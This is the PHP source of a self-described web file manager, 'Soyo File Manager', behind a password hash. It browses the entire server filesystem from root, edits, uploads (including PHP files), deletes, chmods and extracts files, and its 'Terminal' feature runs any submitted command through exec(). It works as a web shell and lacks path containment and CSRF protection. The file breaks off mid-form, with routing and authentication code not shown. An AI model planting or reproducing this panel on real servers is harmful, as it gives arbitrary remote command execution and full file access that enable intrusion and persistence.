<?php
session_start();

// CDN Configuration - Ubah URL ini sesuai domain/CDN Anda
$cdn_config = [
    'assets_url' => 'https://cdn.githubraw.com/sarahmiranawina/SoyoFileManager/main', // Ganti dengan URL CDN Anda
    'use_cdn' => true // Set false untuk menggunakan assets lokal
];

// Configuration - Set root path to current directory where index.php is located
$config = [
    'root_path' => __DIR__,
    'allowed_extensions' => ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'jpg', 'jpeg', 'png', 'gif', 'pdf', 'zip'],
    'max_upload_size' => 50 * 1024 * 1024, // 50MB
    'show_hidden' => false,
    'password_hash' => '$2y$10$Xx1c0aYemh5Xc4oV16j6SOJabT5Z3DBY.pm5CiORPGnk62Jof8NGq',
    'allow_root_access' => true
];


// Helper function to get asset URL
function getAssetUrl($path) {
    global $cdn_config;
    if ($cdn_config['use_cdn']) {
        return $cdn_config['assets_url'] . '/' . ltrim($path, '/');
    }
    return $path; // Fallback to local path
}

// ==================== AUTH FUNCTIONS ====================
function verifyPassword($password, $hash) {
    return password_verify($password, $hash);
}

function generatePasswordHash($password) {
    return password_hash($password, PASSWORD_DEFAULT);
}

// ==================== UTILITY FUNCTIONS ====================
function startsWith($haystack, $needle) {
    return substr($haystack, 0, strlen($needle)) === $needle;
}

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    
    $bytes /= (1 << (10 * $pow));
    
    return round($bytes, $precision) . ' ' . $units[$pow];
}

function getFilePermissions($perms) {
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x' ) :
                (($perms & 0x0800) ? 'S' : '-'));
    
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x' ) :
                (($perms & 0x0400) ? 'S' : '-'));
    
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x' ) :
                (($perms & 0x0200) ? 'T' : '-'));
    
    return $info;
}

function getFileIcon($file, $isDir) {
    if ($isDir) {
        return '📁';
    }
    
    $extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    
    switch ($extension) {
        case 'txt': return '📄';
        case 'php': return '🐘';
        case 'html': return '🌐';
        case 'css': return '🎨';
        case 'js': return '🚀';
        case 'json': return '🗄️';
        case 'xml': return '📜';
        case 'md': return '✍️';
        case 'jpg': case 'jpeg': case 'png': case 'gif': return '🖼️';
        case 'pdf': return '📕';
        case 'zip': return '📦';
        default: return '🗎';
    }
}

function isEditable($file) {
    $editableExtensions = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md'];
    $extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($extension, $editableExtensions);
}

function isViewable($file) {
    $viewableExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $extension = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($extension, $viewableExtensions);
}

function isTextFile($filename) {
    $textExtensions = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'log', 'ini', 'conf', 'htaccess', 'sql', 'csv', 'yml', 'yaml'];
    $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return in_array($extension, $textExtensions);
}

function sortFiles($files, $currentPath, $sortBy, $sortOrder) {
    usort($files, function($a, $b) use ($currentPath, $sortBy, $sortOrder) {
        $aPath = $currentPath . DIRECTORY_SEPARATOR . $a;
        $bPath = $currentPath . DIRECTORY_SEPARATOR . $b;
        
        $isADir = is_dir($aPath);
        $isBDir = is_dir($bPath);
        
        if ($isADir && !$isBDir) {
            return -1;
        } elseif (!$isADir && $isBDir) {
            return 1;
        }
        
        switch ($sortBy) {
            case 'name':
                $result = strnatcasecmp($a, $b);
                break;
            case 'size':
                $aSize = filesize($aPath);
                $bSize = filesize($bPath);
                $result = $aSize - $bSize;
                break;
            case 'date':
                $aTime = filemtime($aPath);
                $bTime = filemtime($bPath);
                $result = $aTime - $bTime;
                break;
            default:
                $result = strnatcasecmp($a, $b);
        }
        
        return ($sortOrder === 'asc') ? $result : -$result;
    });
    
    return $files;
}

function getLanguageFromExtension($extension) {
    $languages = [
        'php' => 'php',
        'html' => 'html',
        'htm' => 'html',
        'css' => 'css',
        'js' => 'javascript',
        'json' => 'json',
        'xml' => 'xml',
        'sql' => 'sql',
        'py' => 'python',
        'java' => 'java',
        'cpp' => 'cpp',
        'c' => 'c',
        'cs' => 'csharp',
        'rb' => 'ruby',
        'go' => 'go',
        'rs' => 'rust',
        'ts' => 'typescript',
        'sh' => 'shell',
        'bash' => 'shell',
        'yml' => 'yaml',
        'yaml' => 'yaml',
        'md' => 'markdown',
        'txt' => 'plaintext',
        'log' => 'plaintext',
        'ini' => 'ini',
        'conf' => 'ini'
    ];
    
    return $languages[$extension] ?? 'plaintext';
}

function recurseCopy($src, $dst) {
    $dir = opendir($src);
    @mkdir($dst);
    while(false !== ( $file = readdir($dir)) ) {
        if (( $file != '.' ) && ( $file != '..' )) {
            if ( is_dir($src . '/' . $file) ) {
                recurseCopy($src . '/' . $file,$dst . '/' . $file);
            }
            else {
                copy($src . '/' . $file,$dst . '/' . $file);
            }
        }
    }
    closedir($dir);
    return true;
}

function generateBreadcrumb($currentPath, $rootPath) {
    global $config;
    
    $breadcrumb = '<a href="?">🏠 Home</a>';
    
    $currentPath = realpath($currentPath) ?: $currentPath;
    
    $pathParts = explode('/', trim($currentPath, '/'));
    $pathParts = array_filter($pathParts, function($part) {
        return !empty($part);
    });
    
    $buildPath = '';
    foreach ($pathParts as $index => $part) {
        $buildPath .= '/' . $part;
        
        $navigationPath = $buildPath;
        $encodedPath = urlencode($navigationPath);
        
        $breadcrumb .= ' / <a href="?path=' . $encodedPath . '">' . htmlspecialchars($part) . '</a>';
    }
    
    $breadcrumb .= '<div style="margin-top: 8px; font-size: 11px; color: #a0a0b0; font-family: monospace;">';
    $breadcrumb .= '📍 Full Path: ' . htmlspecialchars($currentPath);
    $breadcrumb .= '</div>';
    
    return $breadcrumb;
}

function getFolderList() {
    global $config;
    
    $searchPath = $_GET['search_path'] ?? '';
    $folders = [];
    
    if (empty($searchPath)) {
        $searchPath = '/';
    } else {
        if (strpos($searchPath, '/') !== 0) {
            $searchPath = $config['root_path'] . '/' . $searchPath;
        }
    }
    
    try {
        $commonDirs = [
            '/' => 'Root Directory',
            '/home' => 'Home Directory',
            '/var' => 'Var Directory',
            '/tmp' => 'Temp Directory',
            $config['root_path'] => 'Current Root'
        ];
        
        foreach ($commonDirs as $path => $name) {
            if (is_dir($path) && is_readable($path)) {
                $folders[] = [
                    'path' => $path,
                    'name' => $name,
                    'full_path' => $path
                ];
            }
        }
        
        if (is_dir($searchPath) && is_readable($searchPath)) {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($searchPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            $count = 0;
            foreach ($iterator as $file) {
                if ($count++ > 50) break;
                
                if ($file->isDir()) {
                    $fullPath = $file->getPathname();
                    $relativePath = str_replace($config['root_path'], '', $fullPath);
                    $relativePath = trim($relativePath, '/\\');
                    
                    $folders[] = [
                        'path' => $fullPath,
                        'name' => basename($fullPath),
                        'full_path' => $fullPath
                    ];
                }
            }
        }
        
    } catch (Exception $e) {
        $folders = [
            [
                'path' => '/',
                'name' => 'Root Directory',
                'full_path' => '/'
            ],
            [
                'path' => $config['root_path'],
                'name' => 'Current Root',
                'full_path' => $config['root_path']
            ]
        ];
    }
    
    header('Content-Type: application/json');
    echo json_encode($folders);
}

// ==================== FILE OPERATIONS ====================
function viewFile($filePath) {
    $mimeType = mime_content_type($filePath);
    header('Content-Type: ' . $mimeType);
    readfile($filePath);
}

function downloadFile($filePath) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($filePath) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filePath));
    readfile($filePath);
}

function deleteFile($filePath) {
    if (unlink($filePath)) {
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($_GET['path'])));
    } else {
        echo "Error deleting file.";
    }
}

function uploadFiles($targetDirectory) {
    global $config;
    
    if (!is_dir($targetDirectory) || !is_writable($targetDirectory)) {
        echo "Target directory is not writable.";
        return;
    }
    
    $files = $_FILES['files'];
    
    for ($i = 0; $i < count($files['name']); $i++) {
        $fileName = $files['name'][$i];
        $fileTmpName = $files['tmp_name'][$i];
        $fileSize = $files['size'][$i];
        $fileError = $files['error'][$i];
        
        if ($fileError === 0) {
            $fileExt = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
            if (in_array($fileExt, $config['allowed_extensions'])) {
                if ($fileSize <= $config['max_upload_size']) {
                    $fileDestination = $targetDirectory . '/' . $fileName;
                    if (move_uploaded_file($fileTmpName, $fileDestination)) {
                        // Success
                    } else {
                        echo "Error uploading file: " . $fileName . "<br>";
                    }
                } else {
                    echo "File size exceeds maximum limit: " . $fileName . "<br>";
                }
            } else {
                echo "Invalid file type: " . $fileName . "<br>";
            }
        } else {
            echo "Error during upload: " . $fileName . "<br>";
        }
    }
    
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
}

function createFolder($targetDirectory, $folderName) {
    if (empty($folderName)) {
        echo "Folder name cannot be empty.";
        return;
    }
    
    $newFolderPath = $targetDirectory . '/' . $folderName;
    
    if (mkdir($newFolderPath)) {
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
    } else {
        echo "Error creating folder.";
    }
}

function createFile($targetDirectory, $fileName, $fileContent = '') {
    if (empty($fileName)) {
        echo "File name cannot be empty.";
        return;
    }
    
    $newFilePath = $targetDirectory . '/' . $fileName;
    
    if (file_exists($newFilePath)) {
        echo "File already exists.";
        return;
    }
    
    if (file_put_contents($newFilePath, $fileContent) !== false) {
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
    } else {
        echo "Error creating file.";
    }
}

function saveFile($filePath, $content) {
    if (file_put_contents($filePath, $content) !== false) {
        echo "File saved successfully!";
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($_GET['path'])));
    } else {
        echo "Error saving file.";
    }
}

function changePermissions($filePath, $permissions) {
    $permissions = octdec($permissions);
    if (chmod($filePath, $permissions)) {
        echo "Permissions changed successfully!";
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($_GET['path'])));
    } else {
        echo "Error changing permissions.";
    }
}

function compressFiles($targetDirectory, $files, $archiveName) {
    if (empty($files)) {
        echo "No files selected for compression.";
        return;
    }
    
    if (empty($archiveName)) {
        $archiveName = 'archive';
    }
    
    $zip = new ZipArchive();
    $zipFileName = $targetDirectory . '/' . $archiveName . '.zip';
    
    if ($zip->open($zipFileName, ZipArchive::CREATE) === TRUE) {
        foreach ($files as $file) {
            $filePath = $targetDirectory . '/' . $file;
            if (file_exists($filePath)) {
                if (is_dir($filePath)) {
                    addDirectoryToZip($zip, $filePath, $file);
                } else {
                    $zip->addFile($filePath, $file);
                }
            }
        }
        
        $zip->close();
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
    } else {
        echo "Error creating zip archive.";
    }
}

function addDirectoryToZip($zip, $dirPath, $localPath) {
    $zip->addEmptyDir($localPath);
    $files = scandir($dirPath);
    
    foreach ($files as $file) {
        if ($file != '.' && $file != '..') {
            $filePath = $dirPath . '/' . $file;
            $localFilePath = $localPath . '/' . $file;
            
            if (is_dir($filePath)) {
                addDirectoryToZip($zip, $filePath, $localFilePath);
            } else {
                $zip->addFile($filePath, $localFilePath);
            }
        }
    }
}

function extractFile($filePath) {
    $zip = new ZipArchive();
    
    if ($zip->open($filePath) === TRUE) {
        $extractPath = dirname($filePath);
        $zip->extractTo($extractPath);
        $zip->close();
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
    } else {
        echo "Error opening zip archive.";
    }
}

function copyToClipboard($filePath) {
    $_SESSION['clipboard'] = [
        'path' => $filePath,
        'type' => is_dir($filePath) ? 'directory' : 'file'
    ];
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($_GET['path'])));
}

function pasteFromClipboard($targetDirectory) {
    if (!isset($_SESSION['clipboard'])) {
        echo "Clipboard is empty.";
        return;
    }
    
    $sourcePath = $_SESSION['clipboard']['path'];
    $fileName = basename($sourcePath);
    $destinationPath = $targetDirectory . '/' . $fileName;
    
    if (file_exists($destinationPath)) {
        echo "File/directory already exists in the destination.";
        return;
    }
    
    if (is_dir($sourcePath)) {
        if (recurseCopy($sourcePath, $destinationPath)) {
            header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
        } else {
            echo "Error copying directory.";
        }
    } else {
        if (copy($sourcePath, $destinationPath)) {
            header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
        } else {
            echo "Error copying file.";
        }
    }
}

function runTerminalCommand($currentDirectory) {
    session_start();
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
        $cmd = trim($_POST['cmd']);
        $output = [];
        $returnVar = 0;
        chdir($currentDirectory);
        exec($cmd . " 2>&1", $output, $returnVar);
        $_SESSION['terminal_output'] = implode("\n", $output);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path'] ?? '') . '#terminal');
    exit;
}

function bulkDeleteFiles($files, $currentPath) {
    if (empty($files)) {
        echo "No files selected for deletion.";
        return;
    }
    
    $deletedCount = 0;
    foreach ($files as $file) {
        $filePath = $currentPath . '/' . $file;
        if (file_exists($filePath)) {
            if (is_dir($filePath)) {
                if (deleteDirectory($filePath)) {
                    $deletedCount++;
                }
            } else {
                if (unlink($filePath)) {
                    $deletedCount++;
                }
            }
        }
    }
    
    $_SESSION['message'] = "Successfully deleted $deletedCount items.";
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
}

function bulkCopyFiles($files, $currentPath) {
    if (empty($files)) {
        echo "No files selected for copying.";
        return;
    }
    
    $_SESSION['bulk_clipboard'] = [];
    foreach ($files as $file) {
        $filePath = $currentPath . '/' . $file;
        if (file_exists($filePath)) {
            $_SESSION['bulk_clipboard'][] = [
                'path' => $filePath,
                'type' => is_dir($filePath) ? 'directory' : 'file',
                'name' => $file
            ];
        }
    }
    
    $_SESSION['message'] = "Copied " . count($_SESSION['bulk_clipboard']) . " items to clipboard.";
    header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($_GET['path']));
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $filePath = $dir . '/' . $file;
        if (is_dir($filePath)) {
            deleteDirectory($filePath);
        } else {
            unlink($filePath);
        }
    }
    
    return rmdir($dir);
}

// ==================== SEARCH FUNCTIONS ====================
function performFileSearch($rootPath, $filenameQuery, $contentQuery, $filenameType = 'contain', $contentType = 'contain') {
    $results = [];
    $searchCount = 0;
    $maxResults = 1000;
    
    $searchFolder = $_GET['search_folder'] ?? '';
    
    if (!empty($searchFolder)) {
        if ($searchFolder === '/') {
            $searchPath = '/';
        } elseif (strpos($searchFolder, '/') === 0) {
            $searchPath = $searchFolder;
        } else {
            $searchPath = $rootPath . '/' . $searchFolder;
        }
    } else {
        $searchPath = $rootPath;
    }
    
    if (!is_dir($searchPath) || !is_readable($searchPath)) {
        throw new Exception("Search path is not accessible: " . $searchPath);
    }
    
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($searchPath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        
        foreach ($iterator as $file) {
            if ($searchCount++ > $maxResults) {
                break;
            }
            
            if (!$file->isFile()) continue;
            
            $filename = $file->getFilename();
            $fullPath = $file->getPathname();
            
            $relativePath = str_replace($rootPath . DIRECTORY_SEPARATOR, '', $fullPath);
            $relativePath = str_replace(DIRECTORY_SEPARATOR, '/', $relativePath);
            
            $filenameMatch = false;
            $contentMatch = false;
            
            if (!empty($filenameQuery)) {
                $filenameMatch = matchFilename($filename, $filenameQuery, $filenameType);
            }
            
            if (!empty($contentQuery) && isTextFile($filename)) {
                try {
                    if ($file->getSize() < 10 * 1024 * 1024) {
                        $content = file_get_contents($fullPath);
                        if ($content !== false) {
                            $contentMatch = matchContent($content, $contentQuery, $contentType);
                        }
                    }
                } catch (Exception $e) {
                    continue;
                }
            }
            
            $shouldInclude = false;
            $matchType = '';
            
            if (!empty($filenameQuery) && !empty($contentQuery)) {
                if ($filenameMatch && $contentMatch) {
                    $shouldInclude = true;
                    $matchType = 'both';
                }
            } elseif (!empty($filenameQuery)) {
                if ($filenameMatch) {
                    $shouldInclude = true;
                    $matchType = 'filename';
                }
            } elseif (!empty($contentQuery)) {
                if ($contentMatch) {
                    $shouldInclude = true;
                    $matchType = 'content';
                }
            }
            
            if ($shouldInclude) {
                $results[] = [
                    'filename' => $filename,
                    'full_path' => $fullPath,
                    'relative_path' => $relativePath,
                    'directory' => dirname($relativePath),
                    'size' => formatBytes($file->getSize()),
                    'icon' => getFileIcon($filename, false),
                    'is_editable' => isEditable($filename),
                    'match_type' => $matchType
                ];
            }
        }
    } catch (Exception $e) {
        throw new Exception("Search failed: " . $e->getMessage());
    }
    
    return $results;
}

function matchFilename($filename, $query, $type) {
    switch ($type) {
        case 'equal':
            return strcasecmp($filename, $query) === 0;
        case 'start':
            return stripos($filename, $query) === 0;
        case 'end':
            return substr_compare($filename, $query, -strlen($query), strlen($query), true) === 0;
        case 'wildcard':
            $pattern = str_replace(['*', '?'], ['.*', '.'], preg_quote($query, '/'));
            return preg_match('/^' . $pattern . '$/i', $filename);
        case 'contain':
        default:
            return stripos($filename, $query) !== false;
    }
}

function matchContent($content, $query, $type) {
    switch ($type) {
        case 'equal':
            return strcasecmp(trim($content), trim($query)) === 0;
        case 'start':
            return stripos($content, $query) === 0;
        case 'end':
            return substr_compare($content, $query, -strlen($query), strlen($query), true) === 0;
        case 'wildcard':
            $pattern = str_replace(['*', '?'], ['.*', '.'], preg_quote($query, '/'));
            return preg_match('/' . $pattern . '/i', $content);
        case 'contain':
        default:
            return stripos($content, $query) !== false;
    }
}

function bulkDeleteSearchResults($files) {
    if (empty($files)) {
        echo "No files selected for deletion.";
        return;
    }
    
    foreach ($files as $file) {
        $filePath = realpath(__DIR__ . '/' . $file);
        if (file_exists($filePath)) {
            unlink($filePath);
        }
    }
    
    header('Location: ' . $_SERVER['PHP_SELF'] . '?action=search&filename=' . urlencode($_GET['filename'] ?? '') . '&content=' . urlencode($_GET['content'] ?? ''));
}

function debugSearch() {
    global $config;
    
    $filenameQuery = $_GET['filename'] ?? '';
    $contentQuery = $_GET['content'] ?? '';
    $filenameType = $_GET['filename_type'] ?? 'contain';
    $contentType = $_GET['content_type'] ?? 'contain';
    
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Search Debug - Soyo File Manager</title>
        <style>
            body {
                font-family: sans-serif;
                background-color: #f4f4f4;
                color: #333;
                padding: 20px;
            }
            .debug-section {
                background-color: #fff;
                border: 1px solid #ddd;
                padding: 15px;
                margin-bottom: 20px;
                border-radius: 4px;
            }
            .debug-section h3 {
                margin-top: 0;
                color: #555;
            }
            .debug-info {
                margin-bottom: 10px;
            }
            .debug-info strong {
                font-weight: bold;
            }
            code {
                background-color: #eee;
                padding: 2px 5px;
                border-radius: 3px;
            }
            .error {
                color: red;
            }
        </style>
    </head>
    <body>
        <h1>Search Debug Information</h1>';
    
    echo '<div class="debug-section">
        <h3>Search Parameters</h3>
        <div class="debug-info">
            <strong>Filename Query:</strong> ' . ($filenameQuery ? '<code>' . htmlspecialchars($filenameQuery) . '</code> (' . $filenameType . ')' : '<em>Not specified</em>') . '<br>
            <strong>Content Query:</strong> ' . ($contentQuery ? '<code>' . htmlspecialchars($contentQuery) . '</code> (' . $contentType . ')' : '<em>Not specified</em>') . '
        </div>
    </div>';
    
    echo '<div class="debug-section">
        <h3>Configuration</h3>
        <div class="debug-info">
            <strong>Root Path:</strong> <code>' . htmlspecialchars($config['root_path']) . '</code><br>
            <strong>Allowed Extensions:</strong> <code>' . implode(', ', $config['allowed_extensions']) . '</code><br>
            <strong>Max Upload Size:</strong> <code>' . $config['max_upload_size'] . '</code><br>
            <strong>Show Hidden Files:</strong> <code>' . ($config['show_hidden'] ? 'true' : 'false') . '</code>
        </div>
    </div>';
    
    echo '<div class="debug-section">
        <h3>Test Search</h3>';
    
    try {
        $testResults = performFileSearch($config['root_path'], $filenameQuery, $contentQuery, $filenameType, $contentType);
        
        echo '<div class="debug-info">
                <strong>Search Performed Successfully!</strong><br>
                <strong>Results Found:</strong> ' . count($testResults) . '
              </div>';
        
        if (!empty($testResults)) {
            echo '<h4>First 5 Results:</h4><ul>';
            for ($i = 0; $i < min(5, count($testResults)); $i++) {
                echo '<li><code>' . htmlspecialchars($testResults[$i]['relative_path']) . '</code></li>';
            }
            echo '</ul>';
        }
    } catch (Exception $e) {
        echo '<div class="debug-info error">
                <strong>Search Failed:</strong> ' . htmlspecialchars($e->getMessage()) . '
              </div>';
    }
    
    echo '</div>';
    echo '</body></html>';
}

// ==================== TEMPLATE FUNCTIONS ====================
function showLoginForm() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>File Manager - Login</title>
        <style>
            * {
              margin: 0;
              padding: 0;
              box-sizing: border-box;
              font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            }

            body {
              background: linear-gradient(135deg, #1e1e2e 0%, #2d2d44 100%);
              min-height: 100vh;
              display: flex;
              align-items: center;
              justify-content: center;
              font-size: 14px;
            }

            .login-form {
              max-width: 400px;
              width: 100%;
              background: #2a2a3e;
              padding: 40px;
              border-radius: 12px;
              box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
              border: 1px solid #3a3a4e;
            }

            .login-form h2 {
              color: #e0e0e0;
              text-align: center;
              margin-bottom: 30px;
              font-weight: 300;
              font-size: 24px;
              font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            }

            input[type="password"] {
              width: 100%;
              padding: 15px;
              margin: 15px 0;
              border: 1px solid #4a4a5e;
              border-radius: 8px;
              background: #1e1e2e;
              color: #e0e0e0;
              font-size: 14px;
              font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            }

            input[type="password"]:focus {
              outline: none;
              border-color: #6366f1;
              box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
            }

            button {
              width: 100%;
              padding: 15px;
              background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
              color: white;
              border: none;
              border-radius: 8px;
              cursor: pointer;
              font-size: 14px;
              font-weight: 500;
              font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
              transition: all 0.3s ease;
            }

            button:hover {
              transform: translateY(-2px);
              box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
            }
        </style>
    </head>
    <body>
        <div class="login-form">
            <h2>🔐 Soyo File Manager</h2>
            <form method="post">
                <input type="password" name="password" placeholder="Enter password" required>
                <button type="submit">Login</button>
            </form>
        </div>
    </body>
    </html>
    <?php
}

function showFileManager($currentPath, $relativePath) {
    global $config;
    $files = scandir($currentPath);
    $files = array_filter($files, function($file) use ($config) {
        return $file !== '.' && ($config['show_hidden'] || $file[0] !== '.');
    });
    
    $sortBy = $_GET['sort'] ?? 'name';
    $sortOrder = $_GET['order'] ?? 'asc';
    
    $files = sortFiles($files, $currentPath, $sortBy, $sortOrder);
    
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>File Manager</title>
        <link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/main.css'); ?>">
        <link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/forms.css'); ?>">
        <link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/file-list.css'); ?>">
        <link rel="stylesheet" href="<?php echo getAssetUrl('assets/css/dropdown.css'); ?>">
    </head>
    <body>
        <div class="header">
            <h1>📁 Soyo File Manager</h1>
            <a href="?logout=1">🚪 Logout</a>
        </div>
        
        <div class="breadcrumb">
            <?php echo generateBreadcrumb($currentPath, $config['root_path']); ?>
        </div>
        
        <div class="toolbar">
            <button onclick="toggleUpload()">📤 Bulk Upload</button>
            <button onclick="toggleFolder()">📁 Create Folder</button>
            <button onclick="toggleCreateFile()">📄 Create File</button>
            <button onclick="toggleCompress()" class="compress">📦 Compress Selected</button>
            <button onclick="toggleSearch()" class="search">🔍 Search Files</button>
            <button onclick="toggleTerminal()" style="background:linear-gradient(135deg,#111827 0%,#374151 100%);color:white;">🖥️ Terminal</button>
        </div>

        <!-- Enhanced Terminal Form -->
        <div id="terminal-form" class="terminal-form hidden">
            <form method="post" action="?action=terminal&path=<?php echo urlencode($relativePath); ?>">
                <label>Linux Command Terminal</label>
                <input type="text" name="cmd" placeholder="ls -lah">
                <div class="terminal-buttons">
                    <input type="submit" value="Run" class="run-btn">
                    <button type="button" onclick="toggleTerminal()" class="cancel-btn">Cancel</button>
                </div>
            </form>
            <?php if (isset($_SESSION['terminal_output'])): ?>
                <div class="terminal-output"><?php echo htmlspecialchars($_SESSION['terminal_output']); ?></div>
            <?php unset($_SESSION['terminal_output']); ?>
            <?php endif; ?>
        </div>
        
        <!-- Enhanced Search Form -->
        <div id="search-form" class="search-form-enhanced hidden">
            <div class="search-form-grid">
                <div class="search-group">
                    <label>Search by Filename:</label>
                    <div class="search-input-group">
                        <select id="filename-type" class="search-select">
                            <option value="contain">Contains</option>
                            <option value="start">Starts with</option>
                            <option value="end">Ends with</option>
                            <option value="equal">Exact match</option>
                            <option value="wildcard">Wildcard (*?)</option>
                        </select>
                        <input type="text" id="filename-search" placeholder="e.g., *.php, config, index.html" />
                    </div>
                </div>
                <div class="search-group">
                    <label>Search by Content:</label>
                    <div class="search-input-group">
                        <select id="content-type" class="search-select">
                            <option value="contain">Contains</option>
                            <option value="start">Starts with</option>
                            <option value="end">Ends with</option>
                            <option value="equal">Exact match</option>
                            <option value="wildcard">Wildcard (*?)</option>
                        </select>
                        <input type="text" id="content-search" placeholder="e.g., function, &lt;?php, TODO" />
                    </div>
                </div>
                <div class="folder-selection">
                    <label>Search in Folder:</label>
                    <div class="folder-input-group">
                        <input type="hidden" id="search-folder" value="">
                        <input type="text" id="search-folder-display" placeholder="Current Directory" readonly>
                        <button type="button" class="folder-browse-btn" onclick="showFolderBrowser()">📁 Browse</button>
                    </div>
                </div>
            </div>
            <div class="search-buttons">
                <button type="button" class="search-btn" onclick="performSearch()">🔍 Search</button>
                <button type="button" class="cancel-search-btn" onclick="toggleSearch()">Cancel</button>
            </div>
        </div>
        
        <!-- Folder Browser Modal -->
        <div id="folder-browser-modal" class="folder-browser-modal">
            <div class="folder-browser-content">
                <div class="folder-browser-header">
                    <h3>📁 Select Search Folder</h3>
                    <button class="folder-browser-close" onclick="hideFolderBrowser()">✕</button>
                </div>
                <div id="folder-list" class="folder-list">
                    <!-- Folders will be loaded here -->
                </div>
                <div class="folder-browser-footer">
                    <button class="select-folder-btn" onclick="confirmFolderSelection()">Select Folder</button>
                    <button class="cancel-folder-btn" onclick="hideFolderBrowser()">Cancel</button>
                </div>
            </div>
        </div>
        
        <div id="upload-form" class="upload-form hidden">
            <form method="post" enctype="multipart/form-data" action="?action=upload&path=<?php echo urlencode($relativePath); ?>">
                <label>Select multiple files:</label>
                <input type="file" name="files[]" multiple required>
                <input type="submit" value="Upload All">
                <button type="button" onclick="toggleUpload()" style="background: #6b7280; color: white; border: none; padding: 10px 18px; border-radius: 6px; cursor: pointer; margin-left: 10px; font-size: 13px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 500;">Cancel</button>
            </form>
        </div>
        
        <div id="folder-form" class="folder-form hidden">
            <form method="post" action="?action=create_folder&path=<?php echo urlencode($relativePath); ?>">
                <label>Create new folder:</label>
                <input type="text" name="folder_name" placeholder="Folder name" required>
                <input type="submit" value="Create">
                <button type="button" onclick="toggleFolder()" style="background: #6b7280; color: white; border: none; padding: 10px 18px; border-radius: 6px; cursor: pointer; margin-left: 10px; font-size: 13px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-weight: 500;">Cancel</button>
            </form>
        </div>

        <div id="create-file-form" class="upload-form hidden">
            <form method="post" action="?action=create_file&path=<?php echo urlencode($relativePath); ?>">
                <label>Create new file:</label>
